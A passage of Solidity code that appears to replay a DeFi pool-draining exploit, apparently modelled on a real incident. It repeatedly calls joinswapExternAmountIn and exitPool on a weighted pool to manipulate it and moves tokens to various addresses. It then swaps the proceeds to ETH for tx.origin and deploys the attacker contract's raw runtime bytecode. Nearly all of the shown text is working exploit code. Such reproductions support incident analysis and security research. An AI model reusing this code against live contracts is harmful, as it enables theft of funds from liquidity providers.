            {
                // uint256 v15 = 1012219943954244180163497;
                uint256 v15 = I(xfa6d).balanceOf(r);
                console2.log("I(xfa6d).balanceOf(r)\t\t->", "1012219943954244180163497 (1012219.9439 ether)");

                uint256[] memory arr14 = new uint256[](7);
                arr14[0] = 0;
                arr14[1] = 0;
                arr14[2] = 0;
                arr14[3] = 0;
                arr14[4] = 0;
                arr14[5] = 0;
                arr14[6] = 0;
                I(xfa6d).exitPool(v15, arr14);

                // uint256 v16 = 189340188490384593420000;
                uint256 v16 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", "189340188490384593420000 (189340.1884 ether)");
                // uint256 v17 = 189340188490384593420000;
                uint256 v17 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", "189340188490384593420000 (189340.1884 ether)");
                I(xfa6d).getBalance(x6b35);
                I(xfa6d).joinswapExternAmountIn(x6b35, 15329905754807703290000, 0);
                // uint256 v18 = 174010282735576890130000;
                uint256 v18 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", "174010282735576890130000 (174010.2827 ether)");
                // uint256 v19 = 174010282735576890130000;
                uint256 v19 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", "174010282735576890130000 (174010.2827 ether)");
                I(xfa6d).getBalance(x6b35);
                I(xfa6d).joinswapExternAmountIn(x6b35, 22994858632211554935000, 0);
                // uint256 v20 = 151015424103365335195000;
                uint256 v20 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", "151015424103365335195000 (151015.4241 ether)");
                // uint256 v21 = 151015424103365335195000;
                uint256 v21 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", "151015424103365335195000 (151015.4241 ether)");
                I(xfa6d).getBalance(x6b35);
                I(xfa6d).joinswapExternAmountIn(x6b35, 34492287948317332402500, 0);
                // uint256 v22 = 116523136155048002792500;
                uint256 v22 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", "116523136155048002792500 (116523.1361 ether)");
                // uint256 v23 = 116523136155048002792500;
                uint256 v23 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", "116523136155048002792500 (116523.1361 ether)");
                I(xfa6d).getBalance(x6b35);
                I(xfa6d).joinswapExternAmountIn(x6b35, 51738431922475998603750, 0);
                // uint256 v24 = 64784704232572004188750;
                uint256 v24 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", "64784704232572004188750 (64784.7042 ether)");
                // uint256 v25 = 64784704232572004188750;
                uint256 v25 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", "64784704232572004188750 (64784.7042 ether)");
                I(xfa6d).getBalance(x6b35);
                I(xfa6d).joinswapExternAmountIn(x6b35, v25, 0);
                // uint256 v26 = 0;
                uint256 v26 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", uint256(0));
                // uint256 v27 = 755593442157048455280905;
                uint256 v27 = I(xfa6d).balanceOf(r);
                console2.log("I(xfa6d).balanceOf(r)\t\t->", "755593442157048455280905 (755593.4421 ether)");

                uint256[] memory arr16 = new uint256[](7);
                arr16[0] = 0;
                arr16[1] = 0;
                arr16[2] = 0;
                arr16[3] = 0;
                arr16[4] = 0;
                arr16[5] = 0;
                arr16[6] = 0;
                I(xfa6d).exitPool(v27, arr16);

                I(x1f98).transfer(xd3d2, 1842034710505623705772684);
                I(x7fc6).transfer(xd75e, 221903140618539910609128);
                I(xc00e).transfer(x3150, 41499399814748809500152);
                I(xd533).transfer(x58dc, 3220860703356268493448193);
                I(x9f8f).transfer(xba13, 5793733086458756871233);
            }
            {
                I(xc011).transfer(xa1d7, 455051592866905614636261);
                // uint256 v28 = 180039803192193248480000;
                uint256 v28 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", "180039803192193248480000 (180039.8031 ether)");
                // uint112 v29 = 19362311354909807202718219;
                // uint112 v30 = 53858567990721294314124;
                // uint32 v31 = 1634236521;
                (uint112 v29, uint112 v30, uint32 v31) = I(x7950).getReserves();
                console2.log("I(x7950).getReserves()\t->", v29, v30, v31);
                I(x9f8f).approve(x7a25, type(uint256).max);

                address[] memory arr18 = new address[](2);
                arr18[0] = x9f8f;
                arr18[1] = xc02a;
                I(x7a25)
                    .swapTokensForExactTokens(
                        113534707956799958568, 10000000000000000000000000, arr18, x7950, block.timestamp + 1
                    );

                // uint256 v32 = 180039803192193248480000;
                uint256 v32 = I(x6b35).balanceOf(r);
                console2.log("I(x6b35).balanceOf(r)\t\t->", "180039803192193248480000 (180039.8031 ether)");
                I(x6b35).transfer(x7950, v32);

                address[] memory arr19 = new address[](2);
                arr19[0] = x9f8f;
                arr19[1] = xc02a;
                I(x7a25)
                    .swapTokensForExactETH(
                        15000000000000000000, 10000000000000000000000000, arr19, tx.origin, block.timestamp + 1
                    );
            }
            return;
        }
    }

    function _constructor_() public {
        bytes memory rt = abi.encodePacked(
            hex"6080604052600436106100435760003560e01c806310d1e85c1461004f578063",
            hex"6dbf2fa014610071578063807a994a1461009a57806383feb543146100ba5760",
            hex"0080fd5b3661004a57005b600080fd5b34801561005b57600080fd5b5061006f",
            hex"61006a366004612792565b610116565b005b61008461007f36600461270b565b",
            hex"611ee2565b6040516100919190612a8e565b60405180910390f35b3480156100",
            hex"a657600080fd5b5061006f6100b53660046128e1565b611fff565b3480156100",
            hex"c657600080fd5b5061006f6100d53660046129a8565b6000805460ff92831661",
            hex"0100027fffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            hex"ffff00009091169290931691909117919091179055565b60005460ff166104e8",
            hex"57600054600661010090910460ff1610156104675760008054610100900460ff",
            hex"1690600161014c83612d44565b91906101000a81548160ff021916908360ff16",
            hex"021790555050600e6001600060019054906101000a900460ff16610183919061",
            hex"2d06565b60ff16600681106101a457634e487b7160e01b600052603260045260",
            hex"246000fd5b01546040517f095ea7b30000000000000000000000000000000000",
            hex"0000000000000000000000815273fa6de2697d59e88ed7fc4dfe5a33dac43565",
            hex"ea41600482015260001960248201526001600160a01b039091169063095ea7b3",
            hex"90604401602060405180830381600087803b15801561021d57600080fd5b505a",
            hex"f1158015610231573d6000803e3d6000fd5b505050506040513d601f19601f82",
            hex"01168201806040525081019061025591906128ba565b50600054601690610270",
            hex"90600190610100900460ff16612d06565b60ff168154811061029157634e487b",
            hex"7160e01b600052603260045260246000fd5b9060005260206000209060209182",
            hex"8204019190069054906101000a900460ff16156103ab576000546014906102d0",
            hex"90600190610100900460ff16612d06565b60ff16815481106102f157634e487b",
            hex"7160e01b600052603260045260246000fd5b6000918252602082200154905460",
            hex"01600160a01b039091169063022c0d9f90601590610327906001906101009004",
            hex"60ff16612d06565b60ff168154811061034857634e487b7160e01b6000526032",
            hex"60045260246000fd5b90600052602060002001546000306040518463ffffffff",
            hex"1660e01b815260040161037493929190612ae1565b6000604051808303816000",
            hex"87803b15801561038e57600080fd5b505af11580156103a2573d6000803e3d60",
            hex"00fd5b50505050611edb565b6000546014906103c590600190610100900460ff",
            hex"16612d06565b60ff16815481106103e657634e487b7160e01b60005260326004",
            hex"5260246000fd5b600091825260208220015481546001600160a01b0390911691",
            hex"63022c0d9f9160159061041c90600190610100900460ff16612d06565b60ff16",
            hex"8154811061043d57634e487b7160e01b600052603260045260246000fd5b9060",
            hex"005260206000200154306040518463ffffffff1660e01b815260040161037493",
            hex"929190612ae1565b600080547fffffffffffffffffffffffffffffffffffffff",
            hex"ffffffffffffffffffffff00ff8116825560ff16908061049e83612d44565b91",
            hex"906101000a81548160ff021916908360ff16021790555050306001600160a01b",
            hex"03166310d1e85c306000806040518463ffffffff1660e01b8152600401610374",
            hex"93929190612a2d565b60005460ff1660011415610cae57600554604080517f98",
            hex"836f080000000000000000000000000000000000000000000000000000000081",
            hex"5281516000936001600160a01b0316926398836f089260048082019391829003",
            hex"018186803b15801561055057600080fd5b505afa158015610564573d6000803e",
            hex"3d6000fd5b505050506040513d601f19601f8201168201806040525081019061",
            hex"05889190612765565b91506000905060015b600681101561084957600e816006",
            hex"81106105bb57634e487b7160e01b600052603260045260246000fd5b01546040",
            hex"516370a0823160e01b81523060048201526001600160a01b03909116906370a0",
            hex"82319060240160206040518083038186803b1580156105fd57600080fd5b505a",
            hex"fa158015610611573d6000803e3d6000fd5b505050506040513d601f19601f82",
            hex"011682018060405250810190610635919061296d565b91505b81156108375760",
            hex"055482906000906002906001600160a01b031663f8b2cb4f600e866006811061",
            hex"067857634e487b7160e01b600052603260045260246000fd5b015460405160e0",
            hex"83901b7fffffffff000000000000000000000000000000000000000000000000",
            hex"000000001681526001600160a01b039091166004820152602401602060405180",
            hex"83038186803b1580156106d157600080fd5b505afa1580156106e5573d600080",
            hex"3e3d6000fd5b505050506040513d601f19601f82011682018060405250810190",
            hex"610709919061296d565b6107139190612c86565b905060008282116107245781",
            hex"610726565b825b6005549091506001600160a01b0316638201aa3f600e866006",
            hex"811061075b57634e487b7160e01b600052603260045260246000fd5b0154600e",
            hex"546040517fffffffff0000000000000000000000000000000000000000000000",
            hex"000000000060e085901b1681526001600160a01b039283166004820152602481",
            hex"01869052911660448201526000606482015274446c3b15f9926687d2c40534fd",
            hex"b564000000000000608482015260a4016040805180830381600087803b158015",
            hex"6107e857600080fd5b505af11580156107fc573d6000803e3d6000fd5b505050",
            hex"506040513d601f19601f82011682018060405250810190610820919061298556",
            hex"5b5061082d90508186612cef565b9450505050610638565b8061084181612d29",
            hex"565b915050610591565b50600554604080517f98836f08000000000000000000",
            hex"00000000000000000000000000000000000000815281516000936001600160a0",
            hex"1b0316926398836f089260048082019391829003018186803b1580156108a457",
            hex"600080fd5b505afa1580156108b8573d6000803e3d6000fd5b50505050604051",
            hex"3d601f19601f820116820180604052508101906108dc9190612765565b600654",
            hex"6005546040517f034b904e000000000000000000000000000000000000000000",
            hex"0000000000000081526001600160a01b039182166004820152736b3595068778",
            hex"dd592e39a122f4f5a5cf09c90fe2602482015292945016915063034b904e9060",
            hex"4401600060405180830381600087803b15801561095b57600080fd5b505af115",
            hex"801561096f573d6000803e3d6000fd5b505050506000805b600e546040516370",
            hex"a0823160e01b81523060048201526000916001600160a01b0316906370a08231",
            hex"9060240160206040518083038186803b1580156109bb57600080fd5b505afa15",
            hex"80156109cf573d6000803e3d6000fd5b505050506040513d601f19601f820116",
            hex"820180604052508101906109f3919061296d565b1115610bdd57600e54604051",
            hex"6370a0823160e01b81523060048201526001600160a01b03909116906370a082",
            hex"319060240160206040518083038186803b158015610a3c57600080fd5b505afa",
            hex"158015610a50573d6000803e3d6000fd5b505050506040513d601f19601f8201",
            hex"1682018060405250810190610a74919061296d565b600554600e546040517ff8",
            hex"b2cb4f0000000000000000000000000000000000000000000000000000000081",
            hex"526001600160a01b03918216600482015292935060029291169063f8b2cb4f90",
            hex"60240160206040518083038186803b158015610ada57600080fd5b505afa1580",
            hex"15610aee573d6000803e3d6000fd5b505050506040513d601f19601f82011682",
            hex"018060405250810190610b12919061296d565b610b1c9190612c86565b915080",
            hex"8211610b2b5781610b2d565b805b600554600e546040517f5db3427700000000",
            hex"00000000000000000000000000000000000000000000000081526001600160a0",
            hex"1b03918216600482015260248101849052600060448201529296501690635db3",
            hex"427790606401602060405180830381600087803b158015610b9f57600080fd5b",
            hex"505af1158015610bb3573d6000803e3d6000fd5b505050506040513d601f1960",
            hex"1f82011682018060405250810190610bd7919061296d565b50610977565b6000",
            hex"805460ff169080610bef83612d44565b82546101009290920a60ff8181021990",
            hex"931691909216919091021790555060048054600080546040517f022c0d9f0000",
            hex"0000000000000000000000000000000000000000000000000000815260016001",
            hex"60a01b039093169363022c0d9f93610c7293620100009093046dffffffffffff",
            hex"ffffffffffffffff169291309101612b39565b60006040518083038160008780",
            hex"3b158015610c8c57600080fd5b505af1158015610ca0573d6000803e3d6000fd",
            hex"5b505050505050505050611edb565b60005460ff1660021415611edb57600354",
            hex"6000546040517fa9059cbb000000000000000000000000000000000000000000",
            hex"00000000000000815273fa6de2697d59e88ed7fc4dfe5a33dac43565ea416004",
            hex"820152620100009091046dffffffffffffffffffffffffffff16602482015260",
            hex"01600160a01b039091169063a9059cbb90604401602060405180830381600087",
            hex"803b158015610d4d57600080fd5b505af1158015610d61573d6000803e3d6000",
            hex"fd5b505050506040513d601f19601f82011682018060405250810190610d8591",
            hex"906128ba565b506005546040517f8c28cbe80000000000000000000000000000",
            abi.encode(address(0x00008152736B3595068778dd592E39A122f4f5a5)),
            hex"cf09c90fe260048201526001600160a01b0390911690638c28cbe89060240160",
            hex"0060405180830381600087803b158015610df857600080fd5b505af115801561",
            hex"0e0c573d6000803e3d6000fd5b506000925060079150610e1c9050565b604051",
            hex"908082528060200260200182016040528015610e455781602001602082028036",
            hex"83370190505b506005546040516370a0823160e01b8152306004820152919250",
            hex"6001600160a01b03169063b02f0b739082906370a08231906024016020604051",
            hex"8083038186803b158015610e9257600080fd5b505afa158015610ea6573d6000",
            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
            hex"90610eca919061296d565b836040518363ffffffff1660e01b8152600401610e",
            hex"e8929190612bed565b600060405180830381600087803b158015610f02576000",
            hex"80fd5b505af1158015610f16573d6000803e3d6000fd5b50506003546040517f",
            hex"095ea7b300000000000000000000000000000000000000000000000000000000",
            hex"815273fa6de2697d59e88ed7fc4dfe5a33dac43565ea41600482015260001960",
            hex"248201526001600160a01b03909116925063095ea7b391506044016020604051",
            hex"80830381600087803b158015610f9457600080fd5b505af1158015610fa8573d",
            hex"6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250",
            hex"810190610fcc91906128ba565b5060008060005b6003546040516370a0823160",
            hex"e01b81523060048201526000916001600160a01b0316906370a0823190602401",
            hex"60206040518083038186803b15801561101757600080fd5b505afa1580156110",
            hex"2b573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060",
            hex"40525081019061104f919061296d565b1115611258576003546040516370a082",
            hex"3160e01b81523060048201526001600160a01b03909116906370a08231906024",
            hex"0160206040518083038186803b15801561109857600080fd5b505afa15801561",
            hex"10ac573d6000803e3d6000fd5b505050506040513d601f19601f820116820180",
            hex"604052508101906110d0919061296d565b6005546040517ff8b2cb4f00000000",
            hex"0000000000000000000000000000000000000000000000008152736b35950687",
            hex"78dd592e39a122f4f5a5cf09c90fe260048201529193506002916001600160a0",
            hex"1b039091169063f8b2cb4f9060240160206040518083038186803b1580156111",
            hex"4657600080fd5b505afa15801561115a573d6000803e3d6000fd5b5050505060",
            hex"40513d601f19601f8201168201806040525081019061117e919061296d565b61",
            hex"11889190612c86565b92508183116111975782611199565b815b600554604051",
            hex"7f5db34277000000000000000000000000000000000000000000000000000000",
            hex"008152736b3595068778dd592e39a122f4f5a5cf09c90fe26004820152602481",
            hex"01839052600060448201529192506001600160a01b031690635db34277906064",
            hex"01602060405180830381600087803b15801561121a57600080fd5b505af11580",
            hex"1561122e573d6000803e3d6000fd5b505050506040513d601f19601f82011682",
            hex"018060405250810190611252919061296d565b50610fd3565b60055460405163",
            hex"70a0823160e01b81523060048201526001600160a01b039091169063b02f0b73",
            hex"9082906370a082319060240160206040518083038186803b1580156112a35760",
            hex"0080fd5b505afa1580156112b7573d6000803e3d6000fd5b505050506040513d",
            hex"601f19601f820116820180604052508101906112db919061296d565b86604051",
            hex"8363ffffffff1660e01b81526004016112f9929190612bed565b600060405180",
            hex"830381600087803b15801561131357600080fd5b505af1158015611327573d60",
            hex"00803e3d6000fd5b505050505b6003546040516370a0823160e01b8152306004",
            hex"8201526000916001600160a01b0316906370a082319060240160206040518083",
            hex"038186803b15801561137057600080fd5b505afa158015611384573d6000803e",
            hex"3d6000fd5b505050506040513d601f19601f8201168201806040525081019061",
            hex"13a8919061296d565b11156115b1576003546040516370a0823160e01b815230",
            hex"60048201526001600160a01b03909116906370a0823190602401602060405180",
            hex"83038186803b1580156113f157600080fd5b505afa158015611405573d600080",
            hex"3e3d6000fd5b505050506040513d601f19601f82011682018060405250810190",
            hex"611429919061296d565b6005546040517ff8b2cb4f0000000000000000000000",
            hex"00000000000000000000000000000000008152736b3595068778dd592e39a122",
            hex"f4f5a5cf09c90fe260048201529193506002916001600160a01b039091169063",
            hex"f8b2cb4f9060240160206040518083038186803b15801561149f57600080fd5b",
            hex"505afa1580156114b3573d6000803e3d6000fd5b505050506040513d601f1960",
            hex"1f820116820180604052508101906114d7919061296d565b6114e19190612c86",
            hex"565b92508183116114f057826114f2565b815b6005546040517f5db342770000",
            hex"00000000000000000000000000000000000000000000000000008152736b3595",
            hex"068778dd592e39a122f4f5a5cf09c90fe2600482015260248101839052600060",
            hex"448201529192506001600160a01b031690635db3427790606401602060405180",
            hex"830381600087803b15801561157357600080fd5b505af1158015611587573d60",
            hex"00803e3d6000fd5b505050506040513d601f19601f8201168201806040525081",
            hex"01906115ab919061296d565b5061132c565b6005546040516370a0823160e01b",
            hex"81523060048201526001600160a01b039091169063b02f0b739082906370a082",
            hex"319060240160206040518083038186803b1580156115fc57600080fd5b505afa",
            hex"158015611610573d6000803e3d6000fd5b505050506040513d601f19601f8201",
            hex"1682018060405250810190611634919061296d565b866040518363ffffffff16",
            hex"60e01b8152600401611652929190612bed565b60006040518083038160008780",
            hex"3b15801561166c57600080fd5b505af1158015611680573d6000803e3d6000fd",
            hex"5b5050505060005b60068110156117f557600e81600681106116b157634e487b",
            hex"7160e01b600052603260045260246000fd5b0154601480546001600160a01b03",
            hex"9092169163a9059cbb9190849081106116e857634e487b7160e01b6000526032",
            hex"60045260246000fd5b9060005260206000200160009054906101000a90046001",
            hex"600160a01b03166127106015858154811061172a57634e487b7160e01b600052",
            hex"603260045260246000fd5b906000526020600020015461272f6117429190612c",
            hex"d0565b61174c9190612c86565b6040517fffffffff0000000000000000000000",
            hex"000000000000000000000000000000000060e085901b1681526001600160a01b",
            hex"0390921660048301526024820152604401602060405180830381600087803b15",
            hex"80156117aa57600080fd5b505af11580156117be573d6000803e3d6000fd5b50",
            hex"5050506040513d601f19601f820116820180604052508101906117e291906128",
            hex"ba565b50806117ed81612d29565b915050611687565b506003546040516370a0",
            hex"823160e01b81523060048201526000916001600160a01b0316906370a0823190",
            hex"60240160206040518083038186803b15801561183a57600080fd5b505afa1580",
            hex"1561184e573d6000803e3d6000fd5b505050506040513d601f19601f82011682",
            hex"018060405250810190611872919061296d565b6000546127109061189b906201",
            hex"000090046dffffffffffffffffffffffffffff16612733612c9a565b6118a591",
            hex"90612c59565b6dffffffffffffffffffffffffffff166118bf9190612cef565b",
            hex"9050600080600460009054906101000a90046001600160a01b03166001600160",
            hex"a01b0316630902f1ac6040518163ffffffff1660e01b81526004016060604051",
            hex"8083038186803b15801561191257600080fd5b505afa158015611926573d6000",
            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
            hex"9061194a9190612919565b506dffffffffffffffffffffffffffff9182169350",
            hex"1690506000612710826119728686612cef565b61197c8587612cd0565b611986",
            hex"9190612c86565b6119909190612cef565b61199c90612710612cd0565b6119a6",
            hex"9190612c86565b60408051600280825260608201835292935060009290916020",
            hex"830190803683375050600c5482519293506001600160a01b0316918391506000",
            hex"906119fa57634e487b7160e01b600052603260045260246000fd5b6020026020",
            hex"0101906001600160a01b031690816001600160a01b03168152505073c02aaa39",
            hex"b223fe8d0a0e5c4f27ead9083c756cc281600181518110611a5057634e487b71",
            hex"60e01b600052603260045260246000fd5b6001600160a01b0392831660209182",
            hex"02929092010152600c546040517f095ea7b30000000000000000000000000000",
            abi.encode(address(0x00008152737A250d5630B4CF539739dF2c5DaCB4)),
            hex"c659f2488d6004820152600019602482015291169063095ea7b3906044016020",
            hex"60405180830381600087803b158015611ad757600080fd5b505af1158015611a",
            hex"eb573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060",
            hex"405250810190611b0f91906128ba565b506007546040517f8803dbee00000000",
            hex"00000000000000000000000000000000000000000000000081526001600160a0",
            hex"1b0390911690638803dbee90611b809085906a084595161401484a0000009086",
            hex"9073795065dcc9f64b5614c407a6efdc400da6221fb0904290600401612c3a56",
            hex"5b600060405180830381600087803b158015611b9a57600080fd5b505af11580",
            hex"15611bae573d6000803e3d6000fd5b505050506040513d6000823e601f3d9081",
            hex"01601f19168201604052611bd691908101906127fa565b506003546040516370",
            hex"a0823160e01b81523060048201526001600160a01b039091169063a9059cbb90",
            hex"73795065dcc9f64b5614c407a6efdc400da6221fb09083906370a08231906024",
            hex"0160206040518083038186803b158015611c3857600080fd5b505afa15801561",
            hex"1c4c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180",
            hex"60405250810190611c70919061296d565b6040517fffffffff00000000000000",
            hex"00000000000000000000000000000000000000000060e085901b168152600160",
            hex"0160a01b03909216600483015260248201526044016020604051808303816000",
            hex"87803b158015611cce57600080fd5b505af1158015611ce2573d6000803e3d60",
            hex"00fd5b505050506040513d601f19601f82011682018060405250810190611d06",
            hex"91906128ba565b50604080516002808252606082018352600092602083019080",
            hex"3683375050600c5482519293506001600160a01b031691839150600090611d56",
            hex"57634e487b7160e01b600052603260045260246000fd5b602002602001019060",
            hex"01600160a01b031690816001600160a01b03168152505073c02aaa39b223fe8d",
            hex"0a0e5c4f27ead9083c756cc281600181518110611dac57634e487b7160e01b60",
            hex"0052603260045260246000fd5b6001600160a01b039283166020918202929092",
            hex"0101526007546000546040517f4a25d94a000000000000000000000000000000",
            abi.encode(address(0x0081529190921691634a25D94a91611e51917001)),
            hex"0000000000000000000000000000000090046dffffffffffffffffffffffffff",
            hex"ff16906a084595161401484a00000090869073ba5ed1488be60ba2facc6b66c6",
            hex"d6f0befba22ebe904290600401612ba1565b600060405180830381600087803b",
            hex"158015611e6b57600080fd5b505af1158015611e7f573d6000803e3d6000fd5b",
            hex"505050506040513d6000823e601f3d908101601f19168201604052611ea79190",
            hex"8101906127fa565b5050600080547fffffffffffffffffffffffffffffffffff",
            hex"ffffffffffffffffffffffffffff001690555050505050505050505b50505050",
            hex"50565b6001546060906001600160a01b0316331480611f085750600254600160",
            hex"0160a01b031633145b611f73576040517f08c379a00000000000000000000000",
            hex"0000000000000000000000000000000000815260206004820152600e60248201",
            hex"527f4e6f7420617574686f72697a656400000000000000000000000000000000",
            hex"000060448201526064015b60405180910390fd5b6001600160a01b038516611f",
            hex"8657600080fd5b600080866001600160a01b0316868686604051611fa4929190",
            hex"612a1d565b60006040518083038185875af1925050503d8060008114611fe157",
            hex"6040519150601f19603f3d011682016040523d82523d6000602084013e611fe6",
            hex"565b606091505b509150915081611ff557600080fd5b9695505050505050565b",
            hex"6001546001600160a01b031633148061202257506002546001600160a01b0316",
            hex"33145b612088576040517f08c379a00000000000000000000000000000000000",
            hex"0000000000000000000000815260206004820152600e60248201527f4e6f7420",
            hex"617574686f72697a656400000000000000000000000000000000000060448201",
            hex"52606401611f6a565b600080546dffffffffffffffffffffffffffff83811670",
            hex"0100000000000000000000000000000000027fffff0000000000000000000000",
            hex"000000ffffffffffffffffffffffffffffffff9186166201000002919091167f",
            hex"ffff00000000000000000000000000000000000000000000000000000000ffff",
            hex"909216919091171790556006546040517f50b1e3420000000000000000000000",
            hex"0000000000000000000000000000000000815273fa6de2697d59e88ed7fc4dfe",
            hex"5a33dac43565ea4160048201526001600160a01b03909116906350b1e3429060",
            hex"2401600060405180830381600087803b15801561217b57600080fd5b505af115",
            hex"801561218f573d6000803e3d6000fd5b50505050600560009054906101000a90",
            hex"046001600160a01b03166001600160a01b031663936c34776040518163ffffff",
            hex"ff1660e01b815260040160206040518083038186803b1580156121e157600080",
            hex"fd5b505afa1580156121f5573d6000803e3d6000fd5b505050506040513d601f",
            hex"19601f82011682018060405250810190612219919061296d565b60175560005b",
            hex"600681101561249b576016818154811061224957634e487b7160e01b60005260",
            hex"3260045260246000fd5b90600052602060002090602091828204019190069054",
            hex"906101000a900460ff161561237d5760006014828154811061229157634e487b",
            hex"7160e01b600052603260045260246000fd5b9060005260206000200160009054",
            hex"906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040",
            hex"518163ffffffff1660e01b815260040160606040518083038186803b15801561",
            hex"22e757600080fd5b505afa1580156122fb573d6000803e3d6000fd5b50505050",
            hex"6040513d601f19601f8201168201806040525081019061231f9190612919565b",
            hex"50506dffffffffffffffffffffffffffff169050600a612340826009612cd056",
            hex"5b61234a9190612c86565b6015838154811061236b57634e487b7160e01b6000",
            hex"52603260045260246000fd5b60009182526020909120015550612489565b6000",
            hex"601482815481106123a057634e487b7160e01b600052603260045260246000fd",
            hex"5b9060005260206000200160009054906101000a90046001600160a01b031660",
            hex"01600160a01b0316630902f1ac6040518163ffffffff1660e01b815260040160",
            hex"606040518083038186803b1580156123f657600080fd5b505afa15801561240a",
            hex"573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040",
            hex"525081019061242e9190612919565b506dffffffffffffffffffffffffffff16",
            hex"9150600a9050612450826009612cd0565b61245a9190612c86565b6015838154",
            hex"811061247b57634e487b7160e01b600052603260045260246000fd5b60009182",
            hex"5260209091200155505b8061249381612d29565b91505061221f565b50604051",
            hex"7f10d1e85c000000000000000000000000000000000000000000000000000000",
            hex"00815230906310d1e85c906124dd9083906000908190600401612a2d565b6000",
            hex"60405180830381600087803b1580156124f757600080fd5b505af11580156125",
            hex"0b573d6000803e3d6000fd5b5073ba5ed1488be60ba2facc6b66c6d6f0befba2",
            hex"2ebe925060009150505b60068110156126a857600e816006811061255357634e",
            hex"487b7160e01b600052603260045260246000fd5b01546001600160a01b031663",
            hex"a9059cbb83600e846006811061258557634e487b7160e01b6000526032600452",
            hex"60246000fd5b01546040516370a0823160e01b81523060048201526001600160",
            hex"a01b03909116906370a082319060240160206040518083038186803b15801561",
            hex"25c757600080fd5b505afa1580156125db573d6000803e3d6000fd5b50505050",
            hex"6040513d601f19601f820116820180604052508101906125ff919061296d565b",
            hex"6040517fffffffff000000000000000000000000000000000000000000000000",
            hex"0000000060e085901b1681526001600160a01b03909216600483015260248201",
            hex"52604401602060405180830381600087803b15801561265d57600080fd5b505a",
            hex"f1158015612671573d6000803e3d6000fd5b505050506040513d601f19601f82",
            hex"01168201806040525081019061269591906128ba565b50806126a081612d2956",
            hex"5b915050612529565b50505050565b60008083601f8401126126bf578182fd5b",
            hex"50813567ffffffffffffffff8111156126d6578182fd5b602083019150836020",
            hex"8285010111156126ee57600080fd5b9250929050565b803560ff811681146127",
            hex"0657600080fd5b919050565b60008060008060608587031215612720578384fd",
            hex"5b843561272b81612da6565b935060208501359250604085013567ffffffffff",
            hex"ffffff81111561274d578283fd5b612759878288016126ae565b959894975095",
            hex"50505050565b60008060408385031215612777578182fd5b825161278281612d",
            hex"a6565b6020939093015192949293505050565b60008060008060006080868803",
            hex"12156127a9578081fd5b85356127b481612da6565b9450602086013593506040",
            hex"8601359250606086013567ffffffffffffffff8111156127dd578182fd5b6127",
            hex"e9888289016126ae565b969995985093965092949392505050565b6000602080",
            hex"838503121561280c578182fd5b825167ffffffffffffffff8082111561282357",
            hex"8384fd5b818501915085601f830112612836578384fd5b815181811115612848",
            hex"57612848612d90565b8060051b604051601f19603f8301168101818110858211",
            hex"171561286d5761286d612d90565b604052828152858101935084860182860187",
            hex"018a101561288b578788fd5b8795505b838610156128ad578051855260019590",
            hex"95019493860193860161288f565b5098975050505050505050565b6000602082",
            hex"840312156128cb578081fd5b815180151581146128da578182fd5b9392505050",
            hex"565b600080604083850312156128f3578182fd5b82356128fe81612dbe565b91",
            hex"50602083013561290e81612dbe565b809150509250929050565b600080600060",
            hex"60848603121561292d578283fd5b835161293881612dbe565b60208501519093",
            hex"5061294981612dbe565b604085015190925063ffffffff811681146129625781",
            hex"82fd5b809150509250925092565b60006020828403121561297e578081fd5b50",
            hex"51919050565b60008060408385031215612997578182fd5b5050805160209091",
            hex"01519092909150565b600080604083850312156129ba578182fd5b6129c38361",
            hex"26f5565b91506129d1602084016126f5565b90509250929050565b6000815180",
            hex"845260208085019450808401835b83811015612a125781516001600160a01b03",
            hex"16875295820195908201906001016129ed565b509495945050505050565b8183",
            hex"823760009101908152919050565b6001600160a01b0384168152826020820152",
            hex"816040820152608060608201526000612a8560808301600681527f6e69676765",
            hex"7200000000000000000000000000000000000000000000000000006020820152",
            hex"60400190565b95945050505050565b6000602080835283518082850152825b81",
            hex"811015612aba57858101830151858201604001528201612a9e565b8181111561",
            hex"2acb5783604083870101525b50601f01601f1916929092016040019392505050",
            hex"565b8381528260208201526001600160a01b0382166040820152608060608201",
            hex"526000612a8560808301600681527f6e69676765720000000000000000000000",
            abi.encode(address(0x000000602082015260400190565B6DffffFfFfFF)),
            hex"ffffffffffffffffff841681528260208201526001600160a01b038216604082",
            hex"0152608060608201526000612a8560808301600681527f6e6967676572000000",
            hex"0000000000000000000000000000000000000000000000602082015260400190",
            hex"565b6dffffffffffffffffffffffffffff8616815284602082015260a0604082",
            hex"01526000612bd060a08301866129da565b6001600160a01b0394909416606083",
            hex"015250608001529392505050565b600060408201848352602060408185015281",
            hex"85518084526060860191508287019350845b81811015612c2d57845183529383",
            hex"019391830191600101612c11565b5090979650505050505050565b8581528460",
            hex"2082015260a060408201526000612bd060a08301866129da565b60006dffffff",
            hex"ffffffffffffffffffffff80841680612c7a57612c7a612d7a565b9216919091",
            hex"0492915050565b600082612c9557612c95612d7a565b500490565b60006dffff",
            hex"ffffffffffffffffffffffff80831681851681830481118215151615612cc757",
            hex"612cc7612d64565b02949350505050565b600081600019048311821515161561",
            hex"2cea57612cea612d64565b500290565b600082821015612d0157612d01612d64",
            hex"565b500390565b600060ff821660ff841680821015612d2057612d20612d6456",
